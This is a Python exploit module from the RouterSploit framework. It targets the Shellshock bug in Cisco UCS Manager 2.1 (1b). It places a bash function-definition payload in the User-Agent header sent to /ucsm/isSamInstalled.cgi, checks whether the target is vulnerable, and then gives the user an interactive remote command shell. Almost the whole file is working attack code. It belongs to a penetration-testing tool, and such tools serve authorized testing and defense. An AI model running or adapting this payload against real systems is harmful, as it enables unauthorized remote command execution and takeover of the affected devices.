import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Cisco UCS Manager RCE",
        "description": "Module exploits Cisco UCS Manager 2.1 (1b) Remote Code Execution vulnerability which "
                       "allows executing commands on operating system level.",
        "authors": (
            "thatchriseckert",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/39568/",
            "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash",
        ),
        "devices": (
            "Cisco UCS Manager 2.1 (1b)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self)
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        mark = utils.random_text(32)
        headers = {
            "User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; echo %s; echo "$(%s)"; echo %s;' % (mark, cmd, mark)
        }

        response = self.http_request(
            method="GET",
            path="/ucsm/isSamInstalled.cgi",
            headers=headers
        )
        if response is None:
            return ""

        if mark in response.text:
            regexp = "%s(|.+?)%s" % (mark, mark)
            res = re.findall(regexp, response.text, re.DOTALL)

            if len(res):
                return res[0]

        return ""

    @mute
    def check(self):
        mark = utils.random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True

        return False
